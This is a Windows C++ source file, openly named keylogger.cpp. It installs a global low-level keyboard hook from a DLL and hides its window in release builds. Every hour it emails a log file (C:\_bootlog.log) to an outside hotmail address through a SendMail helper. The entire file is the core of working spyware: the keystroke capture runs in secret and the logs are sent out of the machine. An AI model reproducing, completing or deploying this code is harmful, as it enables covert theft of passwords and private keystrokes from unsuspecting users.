// keylogger.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include <time.h>

#include "sendmail.h"

HINSTANCE	ghInstance	=0;
HWND		ghWnd= 0;
MSG			msg;
BOOL		g_bQuit;


BOOL 
System_Run(void)
{
	if(PeekMessage(&msg,NULL,0,0,PM_REMOVE))
	{										
		TranslateMessage(&msg);				
		DispatchMessage(&msg);		
		
		if(g_bQuit || msg.message == WM_QUIT || msg.message == WM_CLOSE)			
			return FALSE;							
	}
	return TRUE;
}

long __stdcall 
WindowProc(HWND hWnd, UINT message,	WPARAM wParam, LPARAM lParam)
{
	switch(message)
	{
	case WM_ACTIVATE:
		return 1;
	case WM_DESTROY:
	case WM_CLOSE:
		g_bQuit= TRUE;
		return 1;
	default:
		return ::DefWindowProc(hWnd, message, wParam, lParam);
	}
}

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPSTR     lpCmdLine,
                     int       nCmdShow)
{
HINSTANCE	hInstDllHook	= LoadLibrary("dllHook.dll");
HOOKPROC	hookProc		= (HOOKPROC)GetProcAddress(hInstDllHook, "?LowLevelKeyboardProc@@YGJHIJ@Z");
SYSTEMTIME	timeStarted;
SYSTEMTIME	timeNow;

	ghInstance= hInstance;

#ifndef _DEBUG
	WNDCLASSEX	wc;
	wc.hInstance = hInstance;
	wc.lpszClassName = "name";
	wc.lpfnWndProc = WindowProc; 
	wc.style = 0; 
	wc.cbSize = sizeof(WNDCLASSEX); 
	wc.hIcon = NULL; 
	wc.hIconSm = NULL; 
	wc.hCursor = NULL; 
	wc.lpszMenuName =NULL; 
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0; 
	wc.hbrBackground =0; 
	wc.lpszMenuName = NULL; 
	RegisterClassEx(&wc); 
	
	ghWnd= CreateWindowEx(0,(LPCTSTR)"name","", 0,0,0,0,0,HWND_DESKTOP,NULL, hInstance,NULL);
	ShowWindow(ghWnd,SW_HIDE);
#else
	WNDCLASS	wc;
	wc.style		= CS_HREDRAW | CS_VREDRAW ;
	wc.lpfnWndProc	= (WNDPROC)WindowProc;
	wc.cbClsExtra	= 0;
	wc.cbWndExtra	= 0;
	wc.hIcon		= 0;
	wc.hInstance	= ghInstance;
	wc.hCursor		= NULL;
	wc.hbrBackground= (HBRUSH)  GetStockObject(WHITE_BRUSH);
	wc.lpszMenuName	= NULL;
	wc.lpszClassName= "KeyLogger";


	RegisterClass(&wc);

	ghWnd= CreateWindow("KeyLogger", "KeyLogger", 
						WS_VISIBLE, CW_USEDEFAULT,	
						CW_USEDEFAULT, 
						100, 100,NULL, NULL, 
						ghInstance, NULL);

	
#endif

	SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, hInstDllHook, 0);

	GetLocalTime(&timeStarted);

	while(System_Run()){
	
		GetLocalTime(&timeNow);
		if(timeNow.wHour - timeStarted.wHour > 0){
			GetLocalTime(&timeStarted);


			//SendMail
			SendMail("Toto", "toto@toto.com", "Test", "alainpetit21@hotmail.com", "Hello", "C:\\_bootlog.log");
		}


				
		
		
		Sleep(10);
	}
	return 0;
}



